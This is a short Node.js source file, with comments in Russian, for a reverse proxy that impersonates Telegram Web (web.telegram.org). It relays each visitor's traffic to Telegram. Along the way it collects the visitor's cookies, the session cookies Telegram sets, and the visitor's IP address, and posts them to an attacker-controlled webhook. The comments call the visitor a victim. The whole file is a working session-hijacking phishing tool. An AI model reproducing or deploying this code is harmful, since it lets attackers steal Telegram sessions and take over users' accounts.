const http = require('http');
const https = require('https');
const fs = require('fs');
const { URL } = require('url');

const TARGET = 'https://web.telegram.org';

function send(data) {
  const body = JSON.stringify(data);
  const hookUrl = process.env.HOOK;
  if (!hookUrl) return; // если HOOK не задан, просто молчим
  
  const u = new URL(hookUrl);
  const req = https.request({ 
    hostname: u.hostname, 
    path: u.pathname + u.search, 
    method: 'POST', 
    headers: { 
      'Content-Type': 'application/json', 
      'Content-Length': Buffer.byteLength(body) 
    } 
  });
  req.write(body); 
  req.end();
}

const server = http.createServer((req, res) => {
  const targetUrl = new URL(req.url, TARGET);

  // логируем входящие куки от жертвы
  if (req.headers.cookie) {
    send({ t: new Date().toISOString(), ip: req.socket.remoteAddress, url: targetUrl.href, cookie: req.headers.cookie });
  }

  const opts = {
    hostname: targetUrl.hostname,
    path: targetUrl.pathname + targetUrl.search,
    method: req.method,
    headers: { ...req.headers, host: targetUrl.hostname }
  };

  const proxyReq = https.request(opts, (proxyRes) => {
    // логируем Set-Cookie от Telegram
    const sc = proxyRes.headers['set-cookie'];
    if (sc) send({ t: new Date().toISOString(), ip: req.socket.remoteAddress, setcookie: sc });

    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res);
  });

  proxyReq.on('error', () => { res.writeHead(502); res.end(); });
  req.pipe(proxyReq);
});

const port = process.env.PORT || 8080;
server.listen(port, () => console.log('proxy up on port ' + port));
